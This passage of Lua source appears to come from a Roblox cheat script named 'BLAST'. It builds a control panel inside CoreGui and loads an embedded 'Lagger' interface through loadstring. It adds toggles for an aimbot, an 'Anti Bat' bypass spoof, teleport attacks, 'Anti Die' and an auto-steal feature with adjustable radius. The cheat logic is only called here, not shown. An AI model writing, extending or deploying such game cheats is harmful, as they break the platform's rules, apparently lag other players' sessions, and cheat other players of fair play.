padding.PaddingLeft = UDim.new(0, 8) padding.PaddingRight = UDim.new(0, 8) padding.PaddingTop = UDim.new(0, 8) padding.PaddingBottom = UDim.new(0, 8) textLagger = Instance.new("TextLabel", centralContainer) textLagger.BackgroundTransparency = 1 textLagger.Position = UDim2.new(0, 0, 0, 0) textLagger.Size = UDim2.new(0, 80, 0, 22) textLagger.Font = Enum.Font.GothamBlack textLagger.Text = "POWER" textLagger.TextColor3 = UI_CONFIG.TextColor textLagger.TextSize = 13 textLagger.TextXAlignment = Enum.TextXAlignment.Left textLagger.TextYAlignment = Enum.TextYAlignment.Center textLagger.ZIndex = 2 toggleContainer = Instance.new("Frame", centralContainer) toggleContainer.BackgroundColor3 = UI_CONFIG.ToggleOff toggleContainer.Position = UDim2.new(1, -52, 0, 0) toggleContainer.Size = UDim2.new(0, 50, 0, 22) toggleContainer.ZIndex = 2 local toggleCorner = Instance.new("UICorner", toggleContainer) toggleCorner.CornerRadius = UDim.new(1, 0) toggleBall = Instance.new("Frame", toggleContainer) toggleBall.BackgroundColor3 = UI_CONFIG.ToggleOff toggleBall.Size = UDim2.new(0, 18, 0, 18) toggleBall.Position = UDim2.new(0, 3, 0.5, -9) toggleBall.ZIndex = 2 local ballCorner = Instance.new("UICorner", toggleBall) ballCorner.CornerRadius = UDim.new(1, 0) toggleClick = Instance.new("TextButton", toggleContainer) toggleClick.BackgroundTransparency = 0 toggleClick.BackgroundColor3 = UI_CONFIG.ToggleOff toggleClick.Size = UDim2.new(1, 0, 1, 0) toggleClick.ZIndex = 3 toggleClick.Font = Enum.Font.GothamBlack toggleClick.Text = "INACTIVE" toggleClick.TextSize = 8 toggleClick.TextColor3 = Color3.fromRGB(255, 255, 255) toggleClick.TextXAlignment = Enum.TextXAlignment.Center toggleClick.TextYAlignment = Enum.TextYAlignment.Center toggleClick.MouseButton1Click:Connect(toggleLagger) toggleClick.AutoButtonColor = false local clickCorner = Instance.new("UICorner", toggleClick) clickCorner.CornerRadius = UDim.new(1, 0) local btnContainer = Instance.new("Frame", centralContainer) btnContainer.Name = "BtnContainer" btnContainer.BackgroundColor3 = Color3.fromRGB(0, 0, 0) btnContainer.BackgroundTransparency = 1 btnContainer.BorderSizePixel = 0 btnContainer.BorderColor3 = UI_CONFIG.BorderColor btnContainer.Size = UDim2.new(0, 240, 0, 32) btnContainer.Position = UDim2.new(0.5, -120, 0, 28) btnContainer.ZIndex = 2 local containerCornerBtn = Instance.new("UICorner", btnContainer) containerCornerBtn.CornerRadius = UDim.new(1, 0) local btnY = 0 local btnW = 50 local btnH = 30 local espaciado = 6 local totalWidth = (btnW * 4) + (espaciado * 3) local margenIzq = (btnContainer.Size.X.Offset - totalWidth) / 2 btnV1 = Instance.new("TextButton", btnContainer) btnV1.Size = UDim2.new(0, btnW, 0, btnH) btnV1.Position = UDim2.new(0, margenIzq, 0, 1) btnV1.Font = UI_CONFIG.Font btnV1.Text = "V1" btnV1.TextColor3 = UI_CONFIG.ButtonV1 btnV1.TextSize = 11 btnV1.AutoButtonColor = false btnV1.BackgroundColor3 = UI_CONFIG.ButtonInact btnV1.BorderSizePixel = 1 btnV1.BorderColor3 = UI_CONFIG.BorderColor btnV1.ZIndex = 3 local V1Corner = Instance.new("UICorner", btnV1) V1Corner.CornerRadius = UDim.new(1, 0) btnV1.MouseButton1Click:Connect(function() nivelActual = "V1" actualizarBotonesNivel() SaveConfig() end) btnV2 = Instance.new("TextButton", btnContainer) btnV2.Size = UDim2.new(0, btnW, 0, btnH) btnV2.Position = UDim2.new(0, margenIzq + btnW + espaciado, 0, 1) btnV2.Font = UI_CONFIG.Font btnV2.Text = "V2" btnV2.TextColor3 = UI_CONFIG.ButtonV2 btnV2.TextSize = 11 btnV2.AutoButtonColor = false btnV2.BackgroundColor3 = UI_CONFIG.ButtonInact btnV2.BorderSizePixel = 1 btnV2.BorderColor3 = UI_CONFIG.BorderColor btnV2.ZIndex = 3 local V2Corner = Instance.new("UICorner", btnV2) V2Corner.CornerRadius = UDim.new(1, 0) btnV2.MouseButton1Click:Connect(function() nivelActual = "V2" actualizarBotonesNivel() SaveConfig() end) btnV3 = Instance.new("TextButton", btnContainer) btnV3.Size = UDim2.new(0, btnW, 0, btnH) btnV3.Position = UDim2.new(0, margenIzq + (btnW + espaciado) * 2, 0, 1) btnV3.Font = UI_CONFIG.Font btnV3.Text = "V3" btnV3.TextColor3 = UI_CONFIG.ButtonV3 btnV3.TextSize = 11 btnV3.AutoButtonColor = false btnV3.BackgroundColor3 = UI_CONFIG.ButtonInact btnV3.BorderSizePixel = 1 btnV3.BorderColor3 = UI_CONFIG.BorderColor btnV3.ZIndex = 3 local V3Corner = Instance.new("UICorner", btnV3) V3Corner.CornerRadius = UDim.new(1, 0) btnV3.MouseButton1Click:Connect(function() nivelActual = "V3" actualizarBotonesNivel() SaveConfig() end) btnV4 = Instance.new("TextButton", btnContainer) btnV4.Size = UDim2.new(0, btnW, 0, btnH) btnV4.Position = UDim2.new(0, margenIzq + (btnW + espaciado) * 3, 0, 1) btnV4.Font = UI_CONFIG.Font btnV4.Text = "V4" btnV4.TextColor3 = UI_CONFIG.ButtonV4 btnV4.TextSize = 11 btnV4.AutoButtonColor = false btnV4.BackgroundColor3 = UI_CONFIG.ButtonInact btnV4.BorderSizePixel = 1 btnV4.BorderColor3 = UI_CONFIG.BorderColor btnV4.ZIndex = 3 local V4Corner = Instance.new("UICorner", btnV4) V4Corner.CornerRadius = UDim.new(1, 0) btnV4.MouseButton1Click:Connect(function() showWarning(function(confirmed) if confirmed then nivelActual = "V4" actualizarBotonesNivel() SaveConfig() end end) end) modeTextLabel = Instance.new("TextLabel", centralContainer) modeTextLabel.BackgroundTransparency = 1 modeTextLabel.Position = UDim2.new(0, 15, 1, -12) modeTextLabel.Size = UDim2.new(0, 180, 0, 16) modeTextLabel.Font = Enum.Font.GothamBlack modeTextLabel.Text = "MODE SPEED 50-25" modeTextLabel.TextColor3 = UI_CONFIG.ButtonV1 modeTextLabel.TextSize = 11 modeTextLabel.TextXAlignment = Enum.TextXAlignment.Left modeTextLabel.TextYAlignment = Enum.TextYAlignment.Center modeTextLabel.ZIndex = 3 actualizarBotonesNivel() actualizarSwitch() keybindButton.MouseButton1Click:Connect(function() if listeningForInput then return end listeningForInput = true keybindButton.Text = "KEY: ..." keybindButton.BackgroundColor3 = Color3.fromRGB(185, 185, 185) keybindButton.TextColor3 = Color3.fromRGB(255,255,255) end) local inputConnection inputConnection = UserInputService.InputBegan:Connect(function(input, gp) if not listeningForInput then return end if gp then return end local newKey = nil if input.KeyCode ~= Enum.KeyCode.Unknown then newKey = input.KeyCode elseif input.UserInputType == Enum.UserInputType.Gamepad1 and input.KeyCode ~= Enum.KeyCode.Unknown then newKey = input.KeyCode end if newKey then keybind = newKey actualizarKeybindButton() SaveConfig() listeningForInput = false keybindButton.BackgroundColor3 = Color3.fromRGB(45, 45, 45) keybindButton.BackgroundTransparency = 0.3 keybindButton.TextColor3 = Color3.fromRGB(220, 220, 220) end end) local isDragging, dragStart, startPos = false, nil, nil mainFrame.InputBegan:Connect(function(input) if ventanaBloqueada then return end if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then isDragging = true dragStart = input.Position startPos = mainFrame.Position end end) UserInputService.InputChanged:Connect(function(input) if not isDragging or ventanaBloqueada then return end if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then local delta = input.Position - dragStart mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y) end end) mainFrame.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then isDragging = false savedPosition = { XScale = mainFrame.Position.X.Scale, XOffset = mainFrame.Position.X.Offset, YScale = mainFrame.Position.Y.Scale, YOffset = mainFrame.Position.Y.Offset } SaveConfig() end end) UserInputService.InputBegan:Connect(function(input, gp) if gp then return end if input.KeyCode == keybind or (input.UserInputType == Enum.UserInputType.Gamepad1 and input.KeyCode == keybind) then toggleLagger() end end)
]=====]
    local fn, err = loadstring(src)
    if not fn then
        warn("[BLAST] Lagger load error: " .. tostring(err))
        return
    end
    local ok, runErr = pcall(fn)
    if not ok then
        warn("[BLAST] Lagger run error: " .. tostring(runErr))
    end
    if _G.BlastApplyLaggerScale then _G.BlastApplyLaggerScale() end
    pcall(function()
        local g = game:GetService("CoreGui"):FindFirstChild("BlastLagg_UI") or (LP:FindFirstChild("PlayerGui") and LP.PlayerGui:FindFirstChild("BlastLagg_UI"))
        local main = g and g:FindFirstChild("MainFrame")
        local pos = State.laggerPosition
        if main and type(pos) == "table" then
            main.Position = UDim2.new(
                tonumber(pos.XScale) or 0.5,
                tonumber(pos.XOffset) or 0,
                tonumber(pos.YScale) or 0.5,
                tonumber(pos.YOffset) or 0
            )
        end
        if g then g.Enabled = true end
    end)
    State.laggerOpen = true
    task.spawn(saveConfig)
end

-- COMBAT tab
loCount = 0
makeSectionHeader("COMBAT", tabCombat)
toggleRefs.aimbot = makeToggleRow("Aimbot", State.batAimbotToggled, function(on, isSync)
    State.batAimbotToggled = on
    if on then
        -- Disable autoLeft and autoRight when aimbot is turned on
        if State.autoLeftEnabled then
            State.autoLeftEnabled = false
            stopAutoLeft()
        end
        if State.autoRightEnabled then
            State.autoRightEnabled = false
            stopAutoRight()
        end
        pcall(startBatAimbot)
    else
        stopBatAimbot()
    end
    if not isSync then task.spawn(saveConfig) end
end, "aimbot", tabCombat)
makeInputRow("Aimbot Speed", State.AimbotSpeed, function(n)
    if n and n > 0 then State.AimbotSpeed = n; task.spawn(saveConfig) end
end, tabCombat)
makeInputRow("Bypass Speed", State.BypassSpeed, function(n)
    if n and n > 0 then State.BypassSpeed = n; task.spawn(saveConfig) end
end, tabCombat)

-- Aimbot and Bypass versions are independent.
do
    local versionButtons = { normal = {}, antiBatBypass = {} }

    local function selectedVersion(mode)
        if mode == "antiBatBypass" then
            return tostring(State.bypassAimbotVersion or "v1"):lower()
        end
        return tostring(State.normalAimbotVersion or "v1"):lower()
    end

    local function paintVersionRows()
        for mode, buttons in pairs(versionButtons) do
            local selected = selectedVersion(mode)
            for version, button in pairs(buttons) do
                button.BackgroundColor3 = (version == selected) and C.accent or Color3.fromRGB(50, 30, 22)
            end
        end
    end

    local function selectVersion(mode, version)
        if mode == "antiBatBypass" then
            State.bypassAimbotVersion = version
        else
            State.normalAimbotVersion = version
        end
        State.aimbotMode = mode
        State.batAimbotVersion = version
        paintVersionRows()
        if State.batAimbotToggled then
            stopBatAimbot()
            pcall(startBatAimbot)
        end
        task.spawn(saveConfig)
    end

    local function makeVersionRow(labelText, mode)
        local row = Instance.new("Frame", tabCombat)
        row.Size = UDim2.new(1, 0, 0, 28)
        row.BackgroundColor3 = C.card
        row.BackgroundTransparency = 0.05
        row.BorderSizePixel = 0
        row.LayoutOrder = LO()
        row.ZIndex = 7
        mkCorner(row, 9)
        mkStroke(row, C.border, 1.15, 0.38)

        local lbl = Instance.new("TextLabel", row)
        lbl.Size = UDim2.new(0, 52, 1, 0)
        lbl.Position = UDim2.new(0, 8, 0, 0)
        lbl.BackgroundTransparency = 1
        lbl.Text = labelText
        lbl.TextColor3 = C.text
        lbl.Font = Enum.Font.GothamBold
        lbl.TextSize = 10
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        lbl.ZIndex = 8

        for i, version in ipairs({"v1", "v2", "v3", "v4"}) do
            local button = Instance.new("TextButton", row)
            button.Size = UDim2.new(0, 36, 0, 18)
            button.Position = UDim2.new(0, 58 + ((i - 1) * 41), 0.5, -9)
            button.BackgroundTransparency = 0.2
            button.BorderSizePixel = 0
            button.Text = version:upper()
            button.TextColor3 = C.text
            button.Font = Enum.Font.GothamBold
            button.TextSize = 10
            button.ZIndex = 8
            mkCorner(button, 4)
            versionButtons[mode][version] = button
            button.MouseButton1Click:Connect(function()
                selectVersion(mode, version)
            end)
        end
    end

    makeVersionRow("Bypass", "antiBatBypass")
    paintVersionRows()
end

-- TP Bat mode UI removed


toggleRefs.medusaCounter = makeToggleRow("Medusa Counter", State.medusaCounterEnabled, function(on, isSync)
    State.medusaCounterEnabled = on
    if on then setupMedusaCounter(LP.Character) else stopMedusaCounter() end
    if not isSync then task.spawn(saveConfig) end
end, nil, tabCombat)

toggleRefs.batCounter = makeToggleRow("Bat Counter", State.batCounterEnabled, function(on, isSync)
    State.batCounterEnabled = on
    if on then startBatCounter() else stopBatCounter() end
    if not isSync then task.spawn(saveConfig) end
end, nil, tabCombat)

toggleRefs.snowTpBat = makeToggleRow("TP Bat (Snow)", State.snowTpBatEnabled == true, function(on, isSync)
    State.snowTpBatEnabled = on == true
    if _G.BlastSnowTpSet then _G.BlastSnowTpSet(on == true) end
    if mobileButtons and mobileButtons.tpBat and mobileButtons.tpBat.setActive then
        pcall(function() mobileButtons.tpBat.setActive(on == true) end)
    end
    if not isSync then task.spawn(saveConfig) end
end, nil, tabCombat)


-- Anti Bat TP removed

-- Anti Bat (Clean Bat Counter)
toggleRefs.antiBat = makeToggleRow("Anti Bat", State.antiBatEnabled == true, function(on, isSync)
    State.antiBatEnabled = on and true or false
    if on then
        if startAntiBatSpoof then pcall(startAntiBatSpoof) end
    else
        if stopAntiBatSpoof then pcall(stopAntiBatSpoof) end
    end
    if not isSync then task.spawn(saveConfig) end
end, nil, tabCombat)

toggleRefs.antiDie = makeToggleRow("Anti Die", State.antiDieEnabled, function(on, isSync)
    State.antiDieEnabled = on
    if _G.BlastSetAntiDie then _G.BlastSetAntiDie(on) end
    if not isSync then task.spawn(saveConfig) end
end, nil, tabCombat)


makeSectionHeader("JUMP", tabCombat)
do
    local row = Instance.new("Frame", tabCombat)
    row.Name = "Animation Pack"
    row.Size = UDim2.new(1, 0, 0, 42)
    row.BackgroundColor3 = C.card
    row.BackgroundTransparency = 0.05
    row.BorderSizePixel = 0
    row.LayoutOrder = LO()
    row.ZIndex = 7
    styleXzzRow(row)

    local label = Instance.new("TextLabel", row)
    label.Size = UDim2.new(0, 112, 1, 0)
    label.Position = UDim2.new(0, 12, 0, 0)
    label.BackgroundTransparency = 1
    label.Text = "Animation Pack"
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.TextTransparency = 0
    label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    label.TextStrokeTransparency = 1
    label.TextSize = 13
    label.Font = Enum.Font.GothamBlack
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.ZIndex = 8

    local left = Instance.new("TextButton", row)
    left.Name = "LeftArrow"
    left.BackgroundColor3 = C.panel
    left.BackgroundTransparency = 0.18
    left.BorderSizePixel = 0
    left.Text = "<"
    left.TextColor3 = C.text
    left.TextSize = 12
    left.Font = Enum.Font.GothamSemibold
    left.Size = UDim2.new(0, 42, 0, 28)
    left.Position = UDim2.new(1, -156, 0.5, -14)
    left.AutoButtonColor = false
    left.ZIndex = 9
    mkCorner(left, 8)
    mkStroke(left, C.border, 1, 0.45)

    local value = Instance.new("TextLabel", row)
    value.Name = "AnimationPackValue"
    value.BackgroundTransparency = 1
    value.Text = State.animationPack or "OFF"
    value.TextColor3 = C.text
    value.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    value.TextStrokeTransparency = 1
    value.TextSize = 11
    value.Font = Enum.Font.GothamSemibold
    value.TextXAlignment = Enum.TextXAlignment.Center
    value.Size = UDim2.new(0, 62, 1, 0)
    value.Position = UDim2.new(1, -112, 0, 0)
    value.ZIndex = 8

    local right = Instance.new("TextButton", row)
    right.Name = "RightArrow"
    right.BackgroundColor3 = C.panel
    right.BackgroundTransparency = 0.18
    right.BorderSizePixel = 0
    right.Text = ">"
    right.TextColor3 = C.text
    right.TextSize = 12
    right.Font = Enum.Font.GothamSemibold
    right.Size = UDim2.new(0, 42, 0, 28)
    right.Position = UDim2.new(1, -48, 0.5, -14)
    right.AutoButtonColor = false
    right.ZIndex = 9
    mkCorner(right, 8)
    mkStroke(right, C.border, 1, 0.45)

    local function setPackIndex(nextIndex)
        local list = _G.BlastAnimationPack.List
        if nextIndex < 1 then nextIndex = #list end
        if nextIndex > #list then nextIndex = 1 end
        local selectedPack = list[nextIndex]
        _G.BlastAnimationPack.Apply(selectedPack)
        value.Text = State.animationPack
        task.spawn(saveConfig)
    end
    left.MouseButton1Click:Connect(function()
        setPackIndex(_G.BlastAnimationPack.GetIndex(State.animationPack) - 1)
    end)
    right.MouseButton1Click:Connect(function()
        setPackIndex(_G.BlastAnimationPack.GetIndex(State.animationPack) + 1)
    end)
end
makeLine(tabCombat)

-- STEAL tab (Smoke Ambitious Auto Steal — UI alinhada ao Auto Grab)
loCount = 0
local function _buildStealTab()
makeSectionHeader("STEAL", tabSteal)
do
    -- defaults alinhados ao Smoke Auto Grab
    autoGrabStopTime = tonumber(autoGrabStopTime) or 1.29
    _G.AmbitiousSemiSteal = _G.AmbitiousSemiSteal or {}
    _G.AmbitiousSemiSteal.autoGrabStopTime = tonumber(_G.AmbitiousSemiSteal.autoGrabStopTime) or autoGrabStopTime

    local stopTimeRow, stopTimeBox, delayRadiusRow, semiRow, radLbl
    local modeBtns, semiBtns = {}, {}

    local function ensureSemiState()
        _G.AmbitiousSemiSteal = _G.AmbitiousSemiSteal or {}
        local A = _G.AmbitiousSemiSteal
        A.autoGrabStopTime = tonumber(A.autoGrabStopTime) or tonumber(autoGrabStopTime) or 1.29
        return A
    end

    local function styleMode(btn, on)
        if not btn then return end
        if on then
            btn.BackgroundColor3 = C.accent
            btn.TextColor3 = Color3.fromRGB(20, 8, 18)
            btn.BackgroundTransparency = 0.02
        else
            btn.BackgroundColor3 = C.panel
            btn.TextColor3 = C.text
            btn.BackgroundTransparency = 0.1
        end
    end

    local function refreshStealUI()
        local semi = selectedStealMode == "Semi"
        local onV1 = semi and selectedSemiMode == "V1"
        local onV2 = semi and selectedSemiMode == "V2"
        styleMode(modeBtns.Normal, not semi)
        styleMode(modeBtns.Semi, semi)
        if semiRow then semiRow.Visible = semi end
        for m, b in pairs(semiBtns) do
            styleMode(b, m == selectedSemiMode)
        end
        if radLbl then
            radLbl.Text = onV2 and "SemiV2 Radius" or "Steal Radius"
        end
        if stopTimeRow then stopTimeRow.Visible = onV2 end
        if delayRadiusRow then delayRadiusRow.Visible = onV2 end
        local A = ensureSemiState()
        if onV2 and stopTimeBox then
            local t = tostring(State.VLESSVSSemiStopPercent or 75)
            if stopTimeBox.Text ~= t then stopTimeBox.Text = t end
        end
    end

    local function applyStealSync()
        _G.autoStealEnabled = autoStealEnabled == true
        _G.selectedStealMode = selectedStealMode or "Normal"
        _G.selectedSemiMode = selectedSemiMode or "V1"
        _G.autoStealRadius = tonumber(autoStealRadius) or 70
        State.autoStealEnabled = autoStealEnabled == true
        Steal.AutoStealEnabled = autoStealEnabled == true
        Steal.StealRadius = tonumber(autoStealRadius) or Steal.StealRadius
        local A = ensureSemiState()
        A.autoGrabStopTime = tonumber(autoGrabStopTime) or A.autoGrabStopTime
        if type(_G.AmbitiousAutoStealSync) == "function" then
            pcall(_G.AmbitiousAutoStealSync)
        end
        if _G.StealBar and _G.StealBar.SetEnabled then
            pcall(_G.StealBar.SetEnabled, autoStealEnabled == true)
        end
        refreshStealUI()
    end

    toggleRefs.autoSteal = makeToggleRow("Auto Steal", State.autoStealEnabled == true, function(on, isSync)
        autoStealEnabled = on and true or false
        State.autoStealEnabled = autoStealEnabled
        Steal.AutoStealEnabled = autoStealEnabled
        _G.autoStealEnabled = autoStealEnabled
        if on then
            if startAutoSteal then startAutoSteal() end
        else
            if stopAutoSteal then stopAutoSteal() end
        end
        applyStealSync()
        if _G._VLESSVSApplySyncAfterHit then _G._VLESSVSApplySyncAfterHit() end
        if not isSync then task.spawn(saveConfig) end
    end, nil, tabSteal)

    -- Mode: NORMAL | SEMI (mesmo contrato do Smoke Auto Grab)
    do
        local row = Instance.new("Frame", tabSteal)
        row.Size = UDim2.new(1, 0, 0, 36)
        row.BackgroundColor3 = C.card
        row.BackgroundTransparency = 0.05
        row.BorderSizePixel = 0
        row.LayoutOrder = LO()
        row.ZIndex = 7
        mkCorner(row, 9)
        mkStroke(row, C.border, 1.15, 0.38)
        local lbl = Instance.new("TextLabel", row)
        lbl.Size = UDim2.new(0, 54, 1, 0)
        lbl.Position = UDim2.new(0, 12, 0, 0)
        lbl.BackgroundTransparency = 1
        lbl.Text = "Mode"
        lbl.TextColor3 = C.text
        lbl.Font = Enum.Font.GothamBold
        lbl.TextSize = 12
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        lbl.ZIndex = 8
        local function mkModeBtn(text, xOff)
            local btn = Instance.new("TextButton", row)
            btn.Size = UDim2.new(0, 78, 0, 26)
            btn.Position = UDim2.new(1, xOff, 0.5, -13)
            btn.BackgroundColor3 = C.panel
            btn.BorderSizePixel = 0
            btn.Text = text
            btn.Font = Enum.Font.GothamBlack
            btn.TextSize = 11
            btn.TextColor3 = C.text
            btn.AutoButtonColor = false
            btn.ZIndex = 9
            mkCorner(btn, 7)
            return btn
        end
        modeBtns.Normal = mkModeBtn("NORMAL", -172)
        modeBtns.Semi = mkModeBtn("SEMI", -88)
        modeBtns.Normal.MouseButton1Click:Connect(function()
            selectedStealMode = "Normal"
            _G.selectedStealMode = "Normal"
            autoStealRadius = (_G.AmbitiousStealRadii and _G.AmbitiousStealRadii.Normal) or autoStealRadius or 70
            applyStealSync()
            task.spawn(saveConfig)
        end)
        modeBtns.Semi.MouseButton1Click:Connect(function()
            selectedStealMode = "Semi"
            _G.selectedStealMode = "Semi"
            if selectedSemiMode == "V2" then
                autoStealRadius = (_G.AmbitiousStealRadii and _G.AmbitiousStealRadii.SemiV2Radius) or 68
            else
                autoStealRadius = (_G.AmbitiousStealRadii and _G.AmbitiousStealRadii.Semi) or 68
            end
            applyStealSync()
            task.spawn(saveConfig)
        end)
    end

    -- Semi sub-mode: V1 | V2
    do
        semiRow = Instance.new("Frame", tabSteal)
        semiRow.Size = UDim2.new(1, 0, 0, 36)
        semiRow.BackgroundColor3 = C.card
        semiRow.BackgroundTransparency = 0.05
        semiRow.BorderSizePixel = 0
        semiRow.LayoutOrder = LO()
        semiRow.ZIndex = 7
        semiRow.Visible = selectedStealMode == "Semi"
        mkCorner(semiRow, 9)
        mkStroke(semiRow, C.border, 1.15, 0.38)
        local lbl = Instance.new("TextLabel", semiRow)
        lbl.Size = UDim2.new(0, 70, 1, 0)
        lbl.Position = UDim2.new(0, 12, 0, 0)
        lbl.BackgroundTransparency = 1
        lbl.Text = "Semi"
        lbl.TextColor3 = C.text
        lbl.Font = Enum.Font.GothamBold
        lbl.TextSize = 12
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        lbl.ZIndex = 8
        local order = {"V1", "V2"}
        for i, mode in ipairs(order) do
            local btn = Instance.new("TextButton", semiRow)
            btn.Size = UDim2.new(0, 48, 0, 26)
            btn.Position = UDim2.new(1, -116 + (i - 1) * 54, 0.5, -13)
            btn.BackgroundColor3 = C.panel
            btn.BorderSizePixel = 0
            btn.Text = mode
            btn.Font = Enum.Font.GothamBlack
            btn.TextSize = 11
            btn.TextColor3 = C.text
            btn.AutoButtonColor = false
            btn.ZIndex = 9
            mkCorner(btn, 7)
            semiBtns[mode] = btn
            btn.MouseButton1Click:Connect(function()
                selectedSemiMode = mode
                _G.selectedSemiMode = mode
                if mode == "V2" then
                    autoStealRadius = (_G.AmbitiousStealRadii and _G.AmbitiousStealRadii.SemiV2Radius) or 68
                else
                    autoStealRadius = (_G.AmbitiousStealRadii and _G.AmbitiousStealRadii.Semi) or 68
                end
                applyStealSync()
                task.spawn(saveConfig)
            end)
        end
    end

    -- Radius (+ / - / box) — igual Auto Grab
    do
        local row = Instance.new("Frame", tabSteal)
        row.Size = UDim2.new(1, 0, 0, 36)
        row.BackgroundColor3 = C.card
        row.BackgroundTransparency = 0.05
        row.BorderSizePixel = 0
        row.LayoutOrder = LO()
        row.ZIndex = 7
        mkCorner(row, 9)
        mkStroke(row, C.border, 1.15, 0.38)
        radLbl = Instance.new("TextLabel", row)
        radLbl.Size = UDim2.new(0, 120, 1, 0)
        radLbl.Position = UDim2.new(0, 12, 0, 0)
        radLbl.BackgroundTransparency = 1
        radLbl.Text = "Steal Radius"
        radLbl.TextColor3 = C.text
        radLbl.Font = Enum.Font.GothamBold
        radLbl.TextSize = 12
        radLbl.TextXAlignment = Enum.TextXAlignment.Left
        radLbl.ZIndex = 8
        local valBox = Instance.new("TextBox", row)
        valBox.Size = UDim2.new(0, 52, 0, 24)
        valBox.Position = UDim2.new(1, -120, 0.5, -12)
        valBox.BackgroundColor3 = C.panel
        valBox.BackgroundTransparency = 0.18
        valBox.BorderSizePixel = 0
        valBox.Text = tostring(math.floor(tonumber(autoStealRadius) or 70))
        valBox.TextColor3 = Color3.fromRGB(255, 255, 255)
        valBox.Font = Enum.Font.GothamBlack
        valBox.TextSize = 12
        valBox.ClearTextOnFocus = false
        valBox.ZIndex = 12
        mkCorner(valBox, 7)
        mkStroke(valBox, C.border, 1, 0.45)
        local function applyRadius(v)
            v = math.clamp(tonumber(v) or 70, 5, 200)
            autoStealRadius = v
            _G.autoStealRadius = v
            Steal.StealRadius = v
            _G.AmbitiousStealRadii = _G.AmbitiousStealRadii or {}
            if selectedStealMode == "Normal" then
                _G.AmbitiousStealRadii.Normal = v
                if _G.AmbitiousNormalAutoStealSetRadius then pcall(_G.AmbitiousNormalAutoStealSetRadius, v) end
                if _G.AmbitiousNormalSteal then _G.AmbitiousNormalSteal.radius = v end
            elseif selectedSemiMode == "V2" then
                _G.AmbitiousStealRadii.SemiV2Radius = v
                if _G.AmbitiousSemiV2SetRadius then pcall(_G.AmbitiousSemiV2SetRadius, v) end
            else
                _G.AmbitiousStealRadii.Semi = v
                if _G.AmbitiousSemiSetRadius then pcall(_G.AmbitiousSemiSetRadius, v) end
            end
            applyStealSync()
            valBox.Text = tostring(math.floor(v))
            return v
        end
        local minusBtn = Instance.new("TextButton", row)
        minusBtn.Size = UDim2.new(0, 26, 0, 24)
        minusBtn.Position = UDim2.new(1, -150, 0.5, -12)
        minusBtn.BackgroundColor3 = C.panel
        minusBtn.BorderSizePixel = 0
        minusBtn.Text = "-"
        minusBtn.TextColor3 = C.text
        minusBtn.Font = Enum.Font.GothamBlack
        minusBtn.TextSize = 16
        minusBtn.ZIndex = 12
        mkCorner(minusBtn, 7)
        local plusBtn = Instance.new("TextButton", row)
        plusBtn.Size = UDim2.new(0, 26, 0, 24)
        plusBtn.Position = UDim2.new(1, -62, 0.5, -12)
        plusBtn.BackgroundColor3 = C.panel
        plusBtn.BorderSizePixel = 0
        plusBtn.Text = "+"
        plusBtn.TextColor3 = C.text
        plusBtn.Font = Enum.Font.GothamBlack
        plusBtn.TextSize = 16
        plusBtn.ZIndex = 12
        mkCorner(plusBtn, 7)
        minusBtn.MouseButton1Click:Connect(function()
            applyRadius((tonumber(autoStealRadius) or 70) - 1)
            task.spawn(saveConfig)
        end)
        plusBtn.MouseButton1Click:Connect(function()
            applyRadius((tonumber(autoStealRadius) or 70) + 1)
            task.spawn(saveConfig)
        end)
        valBox.FocusLost:Connect(function()
            applyRadius(valBox.Text)
            task.spawn(saveConfig)
        end)
        _G._BlastStealRadiusBox = valBox
    end

    -- Stop Time (s) — Semi V1 only (barra pausa neste segundo)
    do
        stopTimeRow = Instance.new("Frame", tabSteal)
        stopTimeRow.Size = UDim2.new(1, 0, 0, 36)
        stopTimeRow.BackgroundColor3 = C.card
        stopTimeRow.BackgroundTransparency = 0.05
        stopTimeRow.BorderSizePixel = 0
        stopTimeRow.LayoutOrder = LO()
        stopTimeRow.ZIndex = 7
        stopTimeRow.Visible = false
        mkCorner(stopTimeRow, 9)
        mkStroke(stopTimeRow, C.border, 1.15, 0.38)
        local lbl = Instance.new("TextLabel", stopTimeRow)
        lbl.Size = UDim2.new(0, 140, 1, 0)
        lbl.Position = UDim2.new(0, 12, 0, 0)
        lbl.BackgroundTransparency = 1
        lbl.Text = "Stop Time (%)"
        lbl.TextColor3 = C.text
        lbl.Font = Enum.Font.GothamBold
        lbl.TextSize = 12
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        lbl.ZIndex = 8
        stopTimeBox = Instance.new("TextBox", stopTimeRow)
        stopTimeBox.Size = UDim2.new(0, 64, 0, 24)
        stopTimeBox.Position = UDim2.new(1, -120, 0.5, -12)
        stopTimeBox.BackgroundColor3 = C.panel
        stopTimeBox.BackgroundTransparency = 0.18
        stopTimeBox.BorderSizePixel = 0
        stopTimeBox.Text = tostring(State.VLESSVSSemiStopPercent or 75)
        stopTimeBox.TextColor3 = Color3.fromRGB(255, 255, 255)
        stopTimeBox.Font = Enum.Font.GothamBlack
        stopTimeBox.TextSize = 12
        stopTimeBox.ClearTextOnFocus = false
        stopTimeBox.ZIndex = 12
        mkCorner(stopTimeBox, 7)
        mkStroke(stopTimeBox, C.border, 1, 0.45)
        local function applyStopTime(v)
            v = tonumber(v)
            if v and v >= 1 and v <= 100 then
                State.VLESSVSSemiStopPercent = v
                if _G.AmbitiousSemiV2Steal then _G.AmbitiousSemiV2Steal.autoGrabStopPercent = v end
            end
            stopTimeBox.Text = tostring(State.VLESSVSSemiStopPercent or 75)
            return State.VLESSVSSemiStopPercent
        end
        local minusBtn = Instance.new("TextButton", stopTimeRow)
        minusBtn.Size = UDim2.new(0, 26, 0, 24)
        minusBtn.Position = UDim2.new(1, -150, 0.5, -12)
        minusBtn.BackgroundColor3 = C.panel
        minusBtn.BorderSizePixel = 0
        minusBtn.Text = "-"
        minusBtn.TextColor3 = C.text
